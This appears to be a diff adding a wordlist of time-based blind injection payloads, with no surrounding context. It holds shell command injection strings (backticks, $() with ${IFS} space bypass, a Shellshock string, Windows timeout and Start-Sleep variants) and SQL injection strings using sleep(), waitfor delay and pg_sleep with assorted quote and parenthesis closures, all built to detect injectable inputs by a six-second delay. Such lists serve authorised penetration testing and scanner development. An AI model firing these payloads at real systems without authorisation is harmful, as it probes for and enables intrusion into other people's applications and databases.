@@ -1,0 +1,36 @@
+`sleep 6`
+`sleep${IFS}6`
+$(sleep 6)
+$(sleep${IFS}6)
+;system('Start-Sleep -s 6')
+;Start-Sleep -s 6|
+|C:\Windows\System32\timeout.exe 6
+|timeout 6|
+`/usr/bin/sleep 6`
+;sleep 6|
+() { :;}; /bin/bash -c "sleep 6"
+&& FOR /F "delims=" %i IN ('timeout 6') DO echo 1
+1 or sleep(6)#
+" or sleep(6)#
+' or sleep(6)#
+1) or sleep(6)#
+1)) or sleep(6)#
+;waitfor delay '0:0:6'--
+);waitfor delay '0:0:6'--
+';waitfor delay '0:0:6'--
+";waitfor delay '0:0:6'--
+');waitfor delay '0:0:6'--
+");waitfor delay '0:0:6'--
+));waitfor delay '0:0:6'--
+'));waitfor delay '0:0:6'--
+"));waitfor delay '0:0:6'--
+pg_sleep(6)--
+1 or pg_sleep(6)--
+" or pg_sleep(6)--
+' or pg_sleep(6)--
+1) or pg_sleep(6)--
+") or pg_sleep(6)--
+') or pg_sleep(6)--
+1)) or pg_sleep(6)--
+")) or pg_sleep(6)--
+')) or pg_sleep(6)--
